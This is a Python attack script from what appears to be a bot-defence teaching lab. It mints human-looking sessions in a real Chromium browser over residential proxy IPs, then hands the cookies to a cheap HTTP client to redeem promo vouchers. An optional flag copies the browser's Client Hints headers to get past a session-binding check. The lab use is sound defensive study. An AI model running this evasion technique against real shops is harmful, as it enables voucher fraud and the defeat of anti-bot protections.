"""
Chapter 8, Round 4 attack: mint in a browser, spend with a cheap client.

Rounds 2 and 3 want sessions that come from different IPs AND look human (landing, JavaScript,
age). So the attacker pays for exactly one real browser per session: Chromium loads the store,
runs the js_ok script and answers the quiz. Then it hands the session cookies off to a cheap
HTTP client, on the same residential IP, to do the (fast) redeem. The expensive browser is
amortised across everything the cheap client does next.

The one thing the cheap client forgets is the browser's Client Hints. The binding check sees the
identity hash move and stops the redeem.

  --copy-hints   copy the Sec-CH-UA* headers off the browser too, so the hash does not move.

Expected:
  level 3                    N/N (no binding yet)
  level 4                    0/N: ua_changed blocks the handoff (session_binding:ua_changed)
  level 4 --copy-hints       N/N: the identity matches; binding has nothing to say

Needs: pip install -r requirements-browser.txt && python -m playwright install chromium

    python attacks/round4_session_mint.py [--copy-hints] [--n 8]
"""

import argparse
import os
import sys
import time
from collections import Counter

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tools"))
import promokit as pk  # noqa: E402
from labclient import BASE_URL, browser_context, world_pool  # noqa: E402

DEFAULT_N = 8


def mint_one(browser, ip, actor):
    """Drive a real browser: land, run the page script, answer the quiz. Return cookies + headers."""
    ctx = browser_context(browser, actor, ip=ip)
    page = ctx.new_page()
    nav = page.goto(BASE_URL + "/")                         # the browser runs the js_ok script here
    sent = nav.request.all_headers()
    page.goto(BASE_URL + "/promo/")
    page.fill("#promo-answer", "7")
    page.click("#promo-unlock button")                     # the page's fetch posts the unlock
    page.wait_for_timeout(400)
    cookies = {c["name"]: c["value"] for c in ctx.cookies()}
    ctx.close()
    return cookies, sent


def run(copy_hints=False, n=DEFAULT_N):
    from playwright.sync_api import sync_playwright

    pool = world_pool("residential_proxy_net")
    name = "r4_mint_copy_hints" if copy_hints else "r4_mint"
    actor = f"bot:{name}"
    sig, succeeded, launches = Counter(), 0, 0
    with sync_playwright() as p:
        browser = p.chromium.launch()
        for i in range(n):
            ip = pool[i % len(pool)]
            cookies, sent = mint_one(browser, ip, actor)
            launches += 1
            hc = pk.new_client(actor, ip=ip)               # the cheap client, same IP as the mint
            for k in ("sid", "js_ok", "promo"):
                if k in cookies:
                    hc.set_cookie(k, cookies[k])
            headers = [("User-Agent", sent.get("user-agent", ""))]
            if copy_hints:
                headers += [(k, v) for k, v in sent.items() if k.startswith("sec-ch-ua")]
            time.sleep(3.3)                                 # let the minted session age
            r = hc.post("/promo/redeem", data={}, headers=headers + pk.JSON_HEADERS)
            if r.status_code == 200 and "voucher" in r.text:
                succeeded += 1
            pk.tally(hc, sig)
        browser.close()
    return pk.report(name, n, succeeded, signals=sig, browser_launches=launches,
                     launches_per_voucher=round(launches / succeeded, 2) if succeeded else None)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--copy-hints", action="store_true", help="copy the browser's Sec-CH-UA* headers too")
    ap.add_argument("--n", type=int, default=DEFAULT_N)
    run(**vars(ap.parse_args()))
